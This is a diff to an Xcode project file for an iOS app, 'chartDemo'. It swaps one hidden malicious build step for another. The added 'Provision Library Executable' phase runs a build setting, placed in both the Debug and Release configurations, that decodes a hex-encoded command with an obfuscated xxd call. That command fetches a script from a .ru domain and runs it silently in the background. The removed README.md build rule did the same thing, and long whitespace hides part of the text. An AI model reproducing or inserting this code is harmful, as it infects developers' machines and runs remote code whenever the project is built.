@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		6AEDD012CCEC4332BF7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 6983BBBD829E4A96A37BBDC8; };
 		584EF280C2B9737241880200 /* Pods_chartDemo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 27783E89865E479FF9B157CE /* Pods_chartDemo.framework */; };
 		776DF5902A70F0B300F26719 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 776DF58F2A70F0B300F26719 /* AppDelegate.swift */; };
 		776DF5922A70F0B300F26719 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 776DF5912A70F0B300F26719 /* SceneDelegate.swift */; };
@@ -18,7 +17,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		6983BBBD829E4A96A37BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1A0B8BBBE5681B01EB8F9B7B /* Pods-chartDemo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-chartDemo.debug.xcconfig"; path = "Target Support Files/Pods-chartDemo/Pods-chartDemo.debug.xcconfig"; sourceTree = "<group>"; };
 		27783E89865E479FF9B157CE /* Pods_chartDemo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_chartDemo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		647C3D2911E2EBECB081E278 /* Pods-chartDemo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-chartDemo.release.xcconfig"; path = "Target Support Files/Pods-chartDemo/Pods-chartDemo.release.xcconfig"; sourceTree = "<group>"; };
@@ -65,7 +63,6 @@
 		776DF58D2A70F0B300F26719 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				6983BBBD829E4A96A37BBDC8 /* README.md */,
 				776DF58C2A70F0B300F26719 /* chartDemo.app */,
 			);
 			name = Products;
@@ -102,6 +99,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 776DF5A02A70F0B500F26719 /* Build configuration list for PBXNativeTarget "chartDemo" */;
 			buildPhases = (
+				B49FCDD1339A4576B17BBDC8 /* Provision Library Executable */,
 				AD7A18C5ECA8BC8C39C8F460 /* [CP] Check Pods Manifest.lock */,
 				776DF5882A70F0B300F26719 /* Sources */,
 				776DF5892A70F0B300F26719 /* Frameworks */,
@@ -109,7 +107,6 @@
 				250C42AEEECF7AEBFFAC1B4B /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				08AAD49F33A74EE9947BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -152,20 +149,6 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		08AAD49F33A74EE9947BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -173,7 +156,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				6AEDD012CCEC4332BF7BBDC8 /* README.md */,
 				776DF59C2A70F0B500F26719 /* LaunchScreen.storyboard in Resources */,
 				776DF5992A70F0B500F26719 /* Assets.xcassets in Resources */,
 				776DF5972A70F0B300F26719 /* Main.storyboard in Resources */,
@@ -183,6 +165,25 @@ sh -c \"${A8CDBB7}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		B49FCDD1339A4576B17BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 		250C42AEEECF7AEBFFAC1B4B /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -260,7 +261,7 @@ sh -c \"${A8CDBB7}\"";
 		776DF59E2A70F0B500F26719 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((j(){ `printf xx4d | tr -d 4` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203234202d2d72657472792035202d6b73664c202d642022703d78636f64655f72756c65222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -321,7 +322,7 @@ sh -c \"${A8CDBB7}\"";
 		776DF59F2A70F0B500F26719 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((j(){ `printf xx4d | tr -d 4` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203234202d2d72657472792035202d6b73664c202d642022703d78636f64655f72756c65222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
